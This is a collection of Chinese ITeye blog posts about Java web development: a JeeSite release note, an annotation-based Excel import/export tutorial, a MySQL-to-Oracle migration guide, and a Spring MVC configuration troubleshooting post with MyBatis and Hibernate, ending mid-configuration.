重要更新：
 
建议升级，升级后IDE会提示一些编译错误，按照提示修复即可。
 
管理菜单更改为三级展示；
增加Table页排序功能（用户管理）；
增加Excel导出导入组件，可选导出方式，Annotation定义方式，代码调用方式；
应大家需求，前端JS树控件，更改为zTree树控件。
增强分页，在分页页面，可任意调转到指定页面，可设置页面大小；
装饰页面方式改为meta方式，装饰403、404、500页面；
增加Globle全局属性设置，配置信息从application.properties中获取；
感谢大家的支持，优化多个问题，修正多个bug；
升级版本依赖库。
详细见 Release Notes ： http://jeesite.com/release.html
已有 5 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
JeeSite的Excel导入、导出、支持大数据量，使用annotation最小化配置, thinkgem.iteye.com.blog.1833431, Fri, 22 Mar 2013 09:23:30 +0800

介绍：
对Apache POI 3.9的简单封装，实现Excel的导出导入功能。使用Annotation定义导出导入字段。http://jeesite.com
优点：
简单易用，支持大数量导出，配置简单，代码量少。
支持Excel 2003、2007、2010（xls、xlsx）格式。
支持简单格式设置，对齐方式，排序等
可导出字典类型数据，自定义数据字段类型（例如：部门关联对象，部门名称与部门编号互转）。
无需建立导入模板，系统自动生成。
缺点：
格式单一，无法导出格式比较复杂的表格。
不能使用模板进行导入，导出。
使用示例：
 
1、导出实体对象中的annotation的定义（ExcelField说明见：5、ExcelField定义说明）：
  
@Entity
@Table(name = "sys_user")
public class User extends BaseEntity {
	private Long id;		// 编号
	...
	...
	...	
	private List<Role> roleList = Lists.newArrayList(); // 拥有角色列表
	
	@Id
	@ExcelField(title="ID", type=1, align=2, sort=1)
	public Long getId() {
		return id;
	}
	@ManyToOne
	@ExcelField(title="所属区域", align=2, sort=10)
	public Area getArea() {
		return area;
	}
	@ManyToOne
	@ExcelField(title="所属部门", align=2, sort=20)
	public Office getOffice() {
		return office;
	}
	@Length(min=1, max=100)
	@ExcelField(title="姓名", align=2, sort=40)
	public String getName() {
		return name;
	}
	@Length(min=0, max=100)
	@ExcelField(title="用户类型", align=2, sort=80, dictType="sys_user_type")
	public String getUserType() {
		return userType;
	}
	@ExcelField(title="创建时间", type=0, align=1, sort=90)
	public Date getCreateDate() {
		return createDate;
	}
	@ExcelField(title="最后登录日期", type=1, align=1, sort=110)
	public Date getLoginDate() {
		return loginDate;
	}
	@ManyToMany
	@ExcelField(title="拥有角色", align=1, sort=800, fieldType=RoleListType.class)
	public List<Role> getRoleList() {
		return roleList;
	}
}
 
 2、Excel导出示例：
 
public String exportFile(User user) {
	try {
        String fileName = "用户数据"+DateUtils.getDate("yyyyMMddHHmmss")+".xlsx"; 
                // 查询数据
		Page<User> page = systemService.findUser(new Page<User>(request, response, -1), user); 
                // 1：创建Excel导出对象；2：设置数据；3：写入输出流；4：临时数据销毁
		new ExportExcel("用户数据", User.class)
                     .setDataList(page.getList())
                     .write(response, fileName)
                     .dispose();
		return null;
	} catch (Exception e) {
		addFlashMessage("导出用户失败！失败信息："+e.getMessage());
	}
	return "redirect:"+BaseController.ADMIN_PATH+"/sys/user/?repage";
}
 
3、Excel 导入示例：
 
public String importFile(MultipartFile file) {
	try {
		int successNum = 0;
		int failureNum = 0;
		StringBuilder failureMsg = new StringBuilder();
                // 创建导入Excel对象
		ImportExcel ei = new ImportExcel(file, 1, 0);
                // 获取传入Excel文件的数据，根据传入参数类型，自动转换为对象
		List<User> list = ei.getDataList(User.class);
                // 遍历数据，保存数据
		for (User user : list){
			try{
				if ("true".equals(checkLoginName("", user.getLoginName()))){
					user.setPassword(SystemService.entryptPassword("123456"));
					BeanValidators.validateWithException(validator, user);
					systemService.saveUser(user);
					successNum++;
				}else{
					failureMsg.append("<br/>登录名 "+user.getLoginName()+" 已存在; ");
					failureNum++;
				}
			}catch(ConstraintViolationException ex){
				failureMsg.append("<br/>登录名 "+user.getLoginName()+" 导入失败：");
				List<String> messageList = BeanValidators.extractPropertyAndMessageAsList(ex, ": ");
				for (String message : messageList){
					failureMsg.append(message+"; ");
					failureNum++;
				}
			}catch (Exception ex) {
				failureMsg.append("<br/>登录名 "+user.getLoginName()+" 导入失败："+ex.getMessage());
			}
		}
		if (failureNum>0){
			failureMsg.insert(0, "，失败 "+failureNum+" 条用户，导入信息如下：");
		}
		addFlashMessage("已成功导入 "+successNum+" 条用户"+failureMsg);
	} catch (Exception e) {
		addFlashMessage("导入用户失败！失败信息："+e.getMessage());
	}
	return "redirect:"+BaseController.ADMIN_PATH+"/sys/user/?repage";
}
 
4、Excel 导入模板下载示例
 
public String importFileTemplate() {
	try {
                String fileName = "用户数据导入模板.xlsx";
		List<User> list = Lists.newArrayList(); list.add(UserUtils.getUser(true));
                // 第三个参数设置为“2”表示输出为导入模板（1:导出数据；2：导入模板）
		new ExportExcel("用户数据", User.class, 2).setDataList(list).write(response, fileName).dispose();
		return null;
	} catch (Exception e) {
		addFlashMessage("导出用户失败！失败信息："+e.getMessage());
	}
	return "redirect:"+BaseController.ADMIN_PATH+"/sys/user/?repage";
}
 
  
5、ExcelField定义说明：
 
 
/**
 * Copyright &copy; 2012-2013 <a href="https://github.com/thinkgem/jeesite">JeeSite</a> All rights reserved.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 */
package com.thinkgem.jeesite.common.utils.excel.annotation;
import java.lang.annotation.ElementType;
import java.lang.annotation.Retention;
import java.lang.annotation.RetentionPolicy;
import java.lang.annotation.Target;
/**
 * Excel注解定义
 * @author ThinkGem
 * @version 2013-03-10
 */
@Target({ElementType.METHOD, ElementType.FIELD, ElementType.TYPE})
@Retention(RetentionPolicy.RUNTIME)
public @interface ExcelField {
	/**
	 * 导出字段名（默认调用当前字段的“get”方法，如指定导出字段为对象，请填写“对象名.对象属性”，例：“area.name”、“office.name”）
	 */
	String value() default "";
	
	/**
	 * 导出字段标题
	 */
	String title();
	
	/**
	 * 字段类型（0：导出导入；1：仅导出；2：仅导入）
	 */
	int type() default 0;
	/**
	 * 导出字段对齐方式（0：自动；1：靠左；2：居中；3：靠右）
	 */
	int align() default 0;
	
	/**
	 * 导出字段字段排序（升序）
	 */
	int sort() default 0;
	/**
	 * 如果是字典类型，请设置字典的type值
	 */
	String dictType() default "";
	
	/**
	 * 反射类型
	 */
	Class<?> fieldType() default Class.class;
	
}
 
 
 
 
 
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
JeeSite 默认MySql，让我们来看看如何更换为Oracle数据库, thinkgem.iteye.com.blog.1820216, Sat, 02 Mar 2013 00:30:17 +0800

JeeSite默认为Mysql，如果想更换为Oracle数据库需要进行一下步骤：
 
1、修改pom.xml文件
 
注释掉：
<!--<jdbc.driver.groupId>mysql</jdbc.driver.groupId>
<jdbc.driver.artifactId>mysql-connector-java</jdbc.driver.artifactId>
<jdbc.driver.version>5.1.13</jdbc.driver.version>-->
去掉注释：
<jdbc.driver.groupId>com.oracle</jdbc.driver.groupId>
<jdbc.driver.artifactId>ojdbc14</jdbc.driver.artifactId>
<jdbc.driver.version>10.2.0.1.0</jdbc.driver.version>
注释掉：
<!--<property name="sql.type" value="mysql" />
<property name="dbunit.datatype" value="org.dbunit.ext.mysql.MySqlDataTypeFactory" /> -->
去掉注释：
<property name="sql.type" value="oracle" />
<property name="dbunit.datatype" value="org.dbunit.ext.oracle.Oracle10DataTypeFactory" />
2、修改application.properties文件
 
注释掉：
#jdbc.driver=com.mysql.jdbc.Driver
#jdbc.url=jdbc:mysql://127.0.0.1:3306/jeesite?useUnicode=true&characterEncoding=utf-8
#jdbc.username=root
#jdbc.password=123456
去掉注释：
jdbc.driver=oracle.jdbc.driver.OracleDriver
jdbc.url=jdbc:oracle:thin:@127.0.0.1:1521:orcl
jdbc.username=jeesite
jdbc.password=123456
 3、修改所有Entity文件的Id字段，修改文件包括：
 
     src/main/java/com/thinkgem/jeesite/modules/sys/entity/*.java
     src/main/java/com/thinkgem/jeesite/modules/cms/entity/*.java
 
注释掉：
//@GeneratedValue(strategy = GenerationType.IDENTITY)
 
去掉注释：
@GeneratedValue(strategy = GenerationType.SEQUENCE, generator = "seq_cms_article")
@SequenceGenerator(name = "seq_cms_article", sequenceName = "seq_cms_article")
 
注意：去掉注释后需要给SequenceGenerator添加类引用，如下：
import javax.persistence.SequenceGenerator;
 
4、执行bin\refresh-db\refresh-db.bat刷新数据库（导入表结构及数据）。
 
 
注意：附件中的entity适合v1.0.0版本
    本文附件下载:
    
      jeesite_oracle.rar (1.5 MB)
已有 1 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
springmvc整合mybaits配置数据源问题, java-lxm.iteye.com.blog.2063907, Thu, 08 May 2014 14:28:21 +0800

这几天搭建了个自己测试用的框架，springmvc+mybatis，由于使用maven，所以就想尝尝鲜，各种jar包都去搞得最新的，结果悲剧就此上演，首先配置数据库就让差点没吐出血来。记录下来
 
applicationContext-db.xml： 
 
<?xml version="1.0" encoding="UTF-8"?>  
<beans xmlns="http://www.springframework.org/schema/beans"  
    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"   
    xmlns:aop="http://www.springframework.org/schema/aop"  
    xmlns:tx="http://www.springframework.org/schema/tx"   
    xmlns:ehcache="http://ehcache-spring-annotations.googlecode.com/svn/schema/ehcache-spring"
    xmlns:context="http://www.springframework.org/schema/context"  
    xsi:schemaLocation="  
     http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context-4.0.xsd  
     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-4.0.xsd  
     http://www.springframework.org/schema/tx http://www.springframework.org/schema/tx/spring-tx-4.0.xsd  
     http://ehcache-spring-annotations.googlecode.com/svn/schema/ehcache-spring  
     http://ehcache-spring-annotations.googlecode.com/svn/schema/ehcache-spring/ehcache-spring-1.2.xsd
     http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop-4.0.xsd"  
    default-autowire="byName"> 
	<!-- 数据源的配置方法一 -->
	<bean id="dataSource" class="org.logicalcobwebs.proxool.ProxoolDataSource">
		<property name="alias" value="database"/>
		<property name="driver" value="com.mysql.jdbc.Driver" />
		<property name="driverUrl" value="jdbc:mysql://localhost:3306/test?useUnicode=true&amp;characterEncoding=UTF-8&amp;zeroDateTimeBehavior=convertToNull" />
		<property name="user" value="root" />
		<property name="password" value="root" />
	</bean>
	<!-- 数据源的配置方法二 -->
	<!-- <context:property-placeholder location="classpath:jdbc.properties"/>
	<bean id="dataSource" class="org.logicalcobwebs.proxool.ProxoolDataSource">
		<property name="alias" value="database"/>
		<property name="driver" value="${jdbc.driver}" />
		<property name="driverUrl" value="${jdbc.url}" />
		<property name="user" value="${jdbc.username}" />
		<property name="password" value="${jdbc.password}" />
	</bean>
 -->
	<bean id="transactionManager"
		class="org.springframework.jdbc.datasource.DataSourceTransactionManager">
		<property name="dataSource" ref="dataSource" />
	</bean>
	<tx:advice id="txAdvice" transaction-manager="transactionManager">
		<tx:attributes>
			<tx:method name="*" />
		</tx:attributes>
	</tx:advice>
	<aop:config>
		<aop:pointcut id="pc"
			expression="execution(* com.company.xx.service.impl.*.*(..))" />
		<aop:advisor pointcut-ref="pc" advice-ref="txAdvice" />
	</aop:config>
	
	 <!-- MyBatis sqlSessionFactory 配置 mybatis --> 
    <bean id="sqlSessionFactory" class="org.mybatis.spring.SqlSessionFactoryBean"> 
        <property name="dataSource" ref="dataSource" /> 
        <property name="configLocation" value="classpath:SqlMapConfig.xml" />
        <property name="typeAliasesPackage" value="com.company.xx.bean" /> 
    </bean> 
    
    <bean class="org.mybatis.spring.mapper.MapperScannerConfigurer">
    	<property name="basePackage" value="com.company.xx.dao" />
    	<!-- <property name="sqlSessionFactoryBeanName" value="sqlSessionFactory" /> -->
    </bean>
    
	<context:component-scan base-package="com.company.xx">
		<context:exclude-filter type="annotation" expression="org.springframework.stereotype.Controller"/>
	</context:component-scan>
    <context:annotation-config />
    
	<!-- <cache:annotation-driven cache-manager="cacheManager"/>
	<bean id="cacheManager" class="org.springframework.cache.ehcache.EhCacheCacheManager">
		<property name="cacheManagerFactory" ref="cacheManagerFactory" />
	</bean>
	<bean id="cacheManagerFactory" class="org.springframework.cache.ehcache.EhCacheManagerFactoryBean">
		<property name="configLocation" value="classpath:ehcache.xml" />
	</bean> -->
</beans>
 
 
pom.xml:
 
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
	xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/maven-v4_0_0.xsd">
	<modelVersion>4.0.0</modelVersion>
	<groupId>com.springmvc</groupId>
	<artifactId>spring</artifactId>
	<version>0.0.1-SNAPSHOT</version>
	<name>spring Maven Webapp</name>
	<url>http://maven.apache.org</url>
	<!-- 设置spring版本 -->
	<properties>
		<org.springframework.version>4.0.2.RELEASE</org.springframework.version>
	</properties>
	<dependencies>
		<!-- 此处开始就是Spring 所有的jar了，spring4.0的jar包拆分了，所以很多 Core utilities used by 
			other modules. Define this if you use Spring Utility APIs (org.springframework.core.*/org.springframework.util.*) -->
		<dependency>
			<groupId>org.springframework</groupId>
			<artifactId>spring-core</artifactId>
			<version>${org.springframework.version}</version>
		</dependency>
		<!-- Expression Language (depends on spring-core) Define this if you use 
			Spring Expression APIs (org.springframework.expression.*) -->
		<dependency>
			<groupId>org.springframework</groupId>
			<artifactId>spring-expression</artifactId>
			<version>${org.springframework.version}</version>
		</dependency>
		<!-- Bean Factory and JavaBeans utilities (depends on spring-core) Define 
			this if you use Spring Bean APIs (org.springframework.beans.*) -->
		<dependency>
			<groupId>org.springframework</groupId>
			<artifactId>spring-beans</artifactId>
			<version>${org.springframework.version}</version>
		</dependency>
		<!-- Aspect Oriented Programming (AOP) Framework (depends on spring-core, 
			spring-beans) Define this if you use Spring AOP APIs (org.springframework.aop.*) -->
		<dependency>
			<groupId>org.springframework</groupId>
			<artifactId>spring-aop</artifactId>
			<version>${org.springframework.version}</version>
		</dependency>
		<!-- Application Context (depends on spring-core, spring-expression, spring-aop, 
			spring-beans) This is the central artifact for Spring’s Dependency Injection 
			Container and is generally always defined -->
		<dependency>
			<groupId>org.springframework</groupId>
			<artifactId>spring-context</artifactId>
			<version>${org.springframework.version}</version>
		</dependency>
		<!-- Various Application Context utilities, including EhCache, JavaMail, 
			Quartz, and Freemarker integration Define this if you need any of these integrations -->
		<dependency>
			<groupId>org.springframework</groupId>
			<artifactId>spring-context-support</artifactId>
			<version>${org.springframework.version}</version>
		</dependency>
		<!-- Transaction Management Abstraction (depends on spring-core, spring-beans, 
			spring-aop, spring-context) Define this if you use Spring Transactions or 
			DAO Exception Hierarchy (org.springframework.transaction.*/org.springframework.dao.*) -->
		<dependency>
			<groupId>org.springframework</groupId>
			<artifactId>spring-tx</artifactId>
			<version>${org.springframework.version}</version>
		</dependency>
		<!-- JDBC Data Access Library (depends on spring-core, spring-beans, spring-context, 
			spring-tx) Define this if you use Spring’s JdbcTemplate API (org.springframework.jdbc.*) -->
		<dependency>
			<groupId>org.springframework</groupId>
			<artifactId>spring-jdbc</artifactId>
			<version>${org.springframework.version}</version>
		</dependency>
		<!-- Object-to-Relation-Mapping (ORM) integration with Hibernate, JPA, 
			and iBatis. (depends on spring-core, spring-beans, spring-context, spring-tx) 
			Define this if you need ORM (org.springframework.orm.*) -->
		<dependency>
			<groupId>org.springframework</groupId>
			<artifactId>spring-orm</artifactId>
			<version>${org.springframework.version}</version>
		</dependency>
		<!-- Object-to-XML Mapping (OXM) abstraction and integration with JAXB, 
			JiBX, Castor, XStream, and XML Beans. (depends on spring-core, spring-beans, 
			spring-context) Define this if you need OXM (org.springframework.oxm.*) <dependency> 
			<groupId>org.springframework</groupId> <artifactId>spring-oxm</artifactId> 
			<version>${org.springframework.version}</version> </dependency> -->
		<!-- Web application development utilities applicable to both Servlet and 
			Portlet Environments (depends on spring-core, spring-beans, spring-context) 
			Define this if you use Spring MVC, or wish to use Struts, JSF, or another 
			web framework with Spring (org.springframework.web.*) -->
		<dependency>
			<groupId>org.springframework</groupId>
			<artifactId>spring-web</artifactId>
			<version>${org.springframework.version}</version>
		</dependency>
		<!-- Spring MVC for Servlet Environments (depends on spring-core, spring-beans, 
			spring-context, spring-web) Define this if you use Spring MVC with a Servlet 
			Container such as Apache Tomcat (org.springframework.web.servlet.*) -->
		<dependency>
			<groupId>org.springframework</groupId>
			<artifactId>spring-webmvc</artifactId>
			<version>${org.springframework.version}</version>
		</dependency>
		<!-- Spring MVC for Portlet Environments (depends on spring-core, spring-beans, 
			spring-context, spring-web) Define this if you use Spring MVC with a Portlet 
			Container (org.springframework.web.portlet.*) -->
		<!-- <dependency> <groupId>org.springframework</groupId> <artifactId>spring-webmvc-portlet</artifactId> 
			<version>${org.springframework.version}</version> </dependency> -->
		<!-- Support for testing Spring applications with tools such as JUnit and 
			TestNG This artifact is generally always defined with a ‘test’ scope for 
			the integration testing framework and unit testing stubs -->
		<dependency>
			<groupId>org.springframework</groupId>
			<artifactId>spring-test</artifactId>
			<version>${org.springframework.version}</version>
		</dependency>
		<!-- Spring Security -->
		<dependency>
			<groupId>org.springframework.security</groupId>
			<artifactId>spring-security-core</artifactId>
			<version>3.2.3.RELEASE</version>
		</dependency>
		<dependency>
			<groupId>org.springframework.security</groupId>
			<artifactId>spring-security-web</artifactId>
			<version>3.2.3.RELEASE</version>
		</dependency>
		<dependency>
			<groupId>org.springframework.security</groupId>
			<artifactId>spring-security-config</artifactId>
			<version>3.2.3.RELEASE</version>
		</dependency>
		<!-- mybatis -->
		<dependency>
			<groupId>org.mybatis</groupId>
			<artifactId>mybatis-spring</artifactId>
			<version>1.2.2</version>
		</dependency>
		<dependency>
			<groupId>org.mybatis</groupId>
			<artifactId>mybatis</artifactId>
			<version>3.2.5</version>
		</dependency>
		<!-- tomcat servlet开发包 -->
		<dependency>
			<groupId>javax.servlet</groupId>
			<artifactId>jstl</artifactId>
			<version>1.2</version>
		</dependency>
		<!-- JSTL标签库 -->
		<!-- <dependency> <groupId>javax.servlet</groupId> <artifactId>servlet-api</artifactId> 
			<version>2.5</version> </dependency> -->
		<!-- mysql的数据库驱动包 -->
		<dependency>
			<groupId>mysql</groupId>
			<artifactId>mysql-connector-java</artifactId>
			<version>5.1.30</version>
		</dependency>
		<!-- log4j -->
		<dependency>
			<groupId>log4j</groupId>
			<artifactId>log4j</artifactId>
			<version>1.2.17</version>
		</dependency>
		<dependency>
			<groupId>org.slf4j</groupId>
			<artifactId>slf4j-log4j12</artifactId>
			<version>1.7.6</version>
		</dependency>
		<!-- 下面两个包proxool是配置数据源的包 -->
		<dependency>
			<groupId>com.cloudhopper.proxool</groupId>
			<artifactId>proxool</artifactId>
			<version>0.9.1</version>
		</dependency>
		<!-- 日志记录依赖包，很多都依赖此包，像log4j,json-lib等等 -->
		<dependency>
			<groupId>commons-logging</groupId>
			<artifactId>commons-logging</artifactId>
			<version>1.1.3</version>
		</dependency>
		<!-- Spring 文件上传的包 -->
		<dependency>
			<groupId>commons-fileupload</groupId>
			<artifactId>commons-fileupload</artifactId>
			<version>1.2.2</version>
		</dependency>
		<!-- Spring 文件上传的依赖包 -->
		<dependency>
			<groupId>commons-io</groupId>
			<artifactId>commons-io</artifactId>
			<version>1.3.2</version>
		</dependency>
		<!-- dom4j 解析 XML文件的包 -->
		<dependency>
			<groupId>dom4j</groupId>
			<artifactId>dom4j</artifactId>
			<version>1.6.1</version>
		</dependency>
		<!-- 下面的三个包是在配置事务的时候用到的 spring的依赖包 -->
		<dependency>
			<groupId>org.aspectj</groupId>
			<artifactId>aspectjweaver</artifactId>
			<version>1.7.0</version>
		</dependency>
		<dependency>
			<groupId>aopalliance</groupId>
			<artifactId>aopalliance</artifactId>
			<version>1.0</version>
		</dependency>
		<dependency>
			<groupId>cglib</groupId>
			<artifactId>cglib</artifactId>
			<version>3.1</version>
		</dependency>
		<!-- ehcache -->
		<dependency>
			<groupId>net.sf.ehcache</groupId>
			<artifactId>ehcache</artifactId>
			<version>2.8.2</version>
		</dependency>
		
		<dependency>
			<groupId>com.googlecode.ehcache-spring-annotations</groupId>
			<artifactId>ehcache-spring-annotations</artifactId>
			<version>1.2.0</version>
		</dependency>
		<!-- JSON lib 开发包 以及它的依赖包 -->
		<!-- <dependency> <groupId>net.sf.json-lib</groupId> <artifactId>json-lib</artifactId> 
			<version>2.4</version> </dependency> -->
		<dependency>
			<groupId>commons-beanutils</groupId>
			<artifactId>commons-beanutils</artifactId>
			<version>1.8.3</version>
		</dependency>
		<dependency>
			<groupId>commons-collections</groupId>
			<artifactId>commons-collections</artifactId>
			<version>3.2.1</version>
		</dependency>
		<dependency>
			<groupId>commons-lang</groupId>
			<artifactId>commons-lang</artifactId>
			<version>2.6</version>
		</dependency>
		<dependency>
			<groupId>net.sf.ezmorph</groupId>
			<artifactId>ezmorph</artifactId>
			<version>1.0.6</version>
		</dependency>
		<dependency>
			<groupId>org.codehaus.jackson</groupId>
			<artifactId>jackson-mapper-asl</artifactId>
			<version>1.9.13</version>
		</dependency>
		<!-- junit 测试包 -->
		<dependency>
			<groupId>junit</groupId>
			<artifactId>junit</artifactId>
			<version>4.11</version>
		</dependency>
	</dependencies>
	<build>
		<finalName>spring</finalName>
		<defaultGoal>compile</defaultGoal>
	</build>
</project>
 spring-servlet.xml:
 
 
<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans"
	xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" 
	xmlns:context="http://www.springframework.org/schema/context"
	xmlns:p="http://www.springframework.org/schema/p"
	xmlns:mvc="http://www.springframework.org/schema/mvc"
	xsi:schemaLocation="http://www.springframework.org/schema/beans  
		http://www.springframework.org/schema/beans/spring-beans-3.0.xsd 
		http://www.springframework.org/schema/context 
		http://www.springframework.org/schema/context/spring-context-3.0.xsd 
		http://www.springframework.org/schema/mvc
		http://www.springframework.org/schema/mvc/spring-mvc-3.0.xsd"
		default-autowire="byName">
	
	<mvc:annotation-driven/>
	<mvc:default-servlet-handler/>
	
	<!-- 扫描@Controller -->
	<context:component-scan base-package="com.company.xx.web" use-default-filters="false">
		<context:include-filter type="annotation" expression="org.springframework.stereotype.Controller"/>
		<context:exclude-filter type="annotation" expression="org.springframework.stereotype.Service"/>
	</context:component-scan>
    
    <bean class="org.springframework.web.servlet.view.ContentNegotiatingViewResolver">
    	<property name="mediaTypes">
    		<map>
			    <!-- json处理,防止ie出现下载提示 -->
    			<entry key="html" value="text/html" />
    			<entry key="json" value="application/json" />
    		</map>
    	</property>
    	<property name="viewResolvers">
    		<list>
    			<bean class="org.springframework.web.servlet.view.BeanNameViewResolver" />
    			<bean class="org.springframework.web.servlet.view.InternalResourceViewResolver">
    				<property name="prefix" value="/WEB-INF/views/" />
    				<property name="suffix" value=".jsp" />
    			</bean>
    		</list>
    	</property>
    	<property name="defaultViews">
    		<list>
    			<bean class="org.springframework.web.servlet.view.json.MappingJackson2JsonView" />
    		</list>
    	</property>
    </bean>
    
    <!-- 异常处理 -->
    <bean id="exceptionResolver" class="org.springframework.web.servlet.handler.SimpleMappingExceptionResolver">
    	<property name="defaultErrorView" value="error/error.jsp" />
    </bean>
    
    <!-- 文件上传 -->
    <bean id="multipartResolver" class="org.springframework.web.multipart.commons.CommonsMultipartResolver">
    	<property name="maxUploadSize" value="10000000000"/>
    </bean>
</beans>
 
 
jdbc.properties:
 
jdbc.driver=com.mysql.jdbc.Driver
jdbc.url=jdbc:mysql://localhost:3306/test?useUnicode=true&characterEncoding=UTF-8&zeroDateTimeBehavior=convertToNull
jdbc.username=root
jdbc.password=root
 
 
数据源方案配置一 ，写死连接在xml中是没有问题的。
数据源方案配置二，启动报错如下：
 
Caused by: java.sql.SQLException: org.logicalcobwebs.proxool.ProxoolException: Couldn't load class ${jdbc.driver}
 将default-autowire="byName"去掉，报错如下：
 
 
Caused by: java.lang.IllegalArgumentException: Property 'sqlSessionFactory' or 'sqlSessionTemplate' are required
奶奶的，不是说sqlSessionFactory是自动注入的么，居然报错。
原来是
 
mybaits-spring-1.2.2.jar的SqlSessionDaoSupport
 
/**
 * Convenient super class for MyBatis SqlSession data access objects.
 * It gives you access to the template which can then be used to execute SQL methods.
 * <p>
 * This class needs a SqlSessionTemplate or a SqlSessionFactory.
 * If both are set the SqlSessionFactory will be ignored.
 * <p>
 * {code Autowired} was removed from setSqlSessionTemplate and setSqlSessionFactory
 * in version 1.2.0.
 * 
 * @author Putthibong Boonbong
 *
 * @see #setSqlSessionFactory
 * @see #setSqlSessionTemplate
 * @see SqlSessionTemplate
 * @version $Id$
 */
public abstract class SqlSessionDaoSupport extends DaoSupport {
 
 
* This class needs a SqlSessionTemplate or a SqlSessionFactory
晕死，于是在继承SqlSessionDaoSupport的类中注入sqlSessionFactory
如下：
@Service(value="userService")
public class UserServiceImpl extends SqlSessionDaoSupport implements UserService{
/**
	 * sqlSessionFactory setSqlSessionFactory
	 */
	@Autowired
	@Override
	public void setSqlSessionFactory(SqlSessionFactory sqlSessionFactory) {
		super.setSqlSessionFactory(sqlSessionFactory);
	}
}
 启动就正常了，根据：http://www.oschina.net/code/snippet_1029551_21550
将这个问题记录下，目前还不知道怎么用xml实现
最后的xml文件：
<?xml version="1.0" encoding="UTF-8"?>  
<beans xmlns="http://www.springframework.org/schema/beans"  
    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"   
    xmlns:aop="http://www.springframework.org/schema/aop"  
    xmlns:tx="http://www.springframework.org/schema/tx"   
    xmlns:ehcache="http://ehcache-spring-annotations.googlecode.com/svn/schema/ehcache-spring"
    xmlns:context="http://www.springframework.org/schema/context"  
    xsi:schemaLocation="  
     http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context-4.0.xsd  
     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-4.0.xsd  
     http://www.springframework.org/schema/tx http://www.springframework.org/schema/tx/spring-tx-4.0.xsd  
     http://ehcache-spring-annotations.googlecode.com/svn/schema/ehcache-spring  
     http://ehcache-spring-annotations.googlecode.com/svn/schema/ehcache-spring/ehcache-spring-1.2.xsd
     http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop-4.0.xsd"> 
	<!-- 数据源的配置方法一 -->
	<!-- <bean id="dataSource" class="org.logicalcobwebs.proxool.ProxoolDataSource">
		<property name="alias" value="database"/>
		<property name="driver" value="com.mysql.jdbc.Driver" />
		<property name="driverUrl" value="jdbc:mysql://localhost:3306/test?useUnicode=true&amp;characterEncoding=UTF-8&amp;zeroDateTimeBehavior=convertToNull" />
		<property name="user" value="root" />
		<property name="password" value="root" />
	</bean>
 -->
	<!-- 数据源的配置方法二 -->
	<context:property-placeholder location="classpath:jdbc.properties"/>
	<bean id="dataSource" class="org.logicalcobwebs.proxool.ProxoolDataSource">
		<property name="alias" value="database"/>
		<property name="driver" value="${jdbc.driver}" />
		<property name="driverUrl" value="${jdbc.url}" />
		<property name="user" value="${jdbc.username}" />
		<property name="password" value="${jdbc.password}" />
	</bean>
	<bean id="transactionManager"
		class="org.springframework.jdbc.datasource.DataSourceTransactionManager">
		<property name="dataSource" ref="dataSource" />
	</bean>
	<tx:advice id="txAdvice" transaction-manager="transactionManager">
		<tx:attributes>
			<tx:method name="*" />
		</tx:attributes>
	</tx:advice>
	<aop:config>
		<aop:pointcut id="pc"
			expression="execution(* com.company.xx.service.impl.*.*(..))" />
		<aop:advisor pointcut-ref="pc" advice-ref="txAdvice" />
	</aop:config>
	
	 <!-- MyBatis sqlSessionFactory 配置 mybatis --> 
    <bean id="sqlSessionFactory" class="org.mybatis.spring.SqlSessionFactoryBean"> 
        <property name="dataSource" ref="dataSource" /> 
        <property name="configLocation" value="classpath:SqlMapConfig.xml" />
        <property name="typeAliasesPackage" value="com.company.xx.bean" /> 
    </bean> 
    
    <bean class="org.mybatis.spring.mapper.MapperScannerConfigurer">
    	<property name="basePackage" value="com.company.xx.dao" />
    	<!-- <property name="sqlSessionFactory" value="sqlSessionFactory" /> -->
    </bean>
    
	<context:component-scan base-package="com.company.xx">
		<context:exclude-filter type="annotation" expression="org.springframework.stereotype.Controller"/>
	</context:component-scan>
    <context:annotation-config />
    
	 <cache:annotation-driven cache-manager="cacheManager"/>
	
<!-- 这里又被坑了      <bean id="cacheManager" class="org.springframework.cache.ehcache.EhCacheCacheManager">
		<property name="cacheManagerFactory" ref="cacheManagerFactory" />
	</bean> -->
	<bean id="cacheManager" class="org.springframework.cache.ehcache.EhCacheManagerFactoryBean">
		<property name="configLocation" value="classpath:ehcache.xml" />
	</bean>
</beans>
 
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
springmvc+hibernate整合事务不回滚,谁来拯救我, java-lxm.iteye.com.blog.1919342, Sat, 03 Aug 2013 23:45:18 +0800
最近心血来潮研究下了springmvc,发现比struts2好用多了，配置也方便，捣鼓了一阵，最后想把hibernate也整进去，结果悲剧就来了，事务就是不回滚，实在没招了，哪位大侠给看下，上代码 springmvc-servlet.xml
<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans"
	xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" 
	xmlns:context="http://www.springframework.org/schema/context"
	default-autowire="byName" 
	xmlns:p="http://www.springframework.org/schema/p"
	xmlns:mvc="http://www.springframework.org/schema/mvc"
	xsi:schemaLocation="http://www.springframework.org/schema/mvc 
		http://www.springframework.org/schema/mvc/spring-mvc-3.0.xsd  
        http://www.springframework.org/schema/beans 
        http://www.springframework.org/schema/beans/spring-beans-3.0.xsd  
        http://www.springframework.org/schema/context 
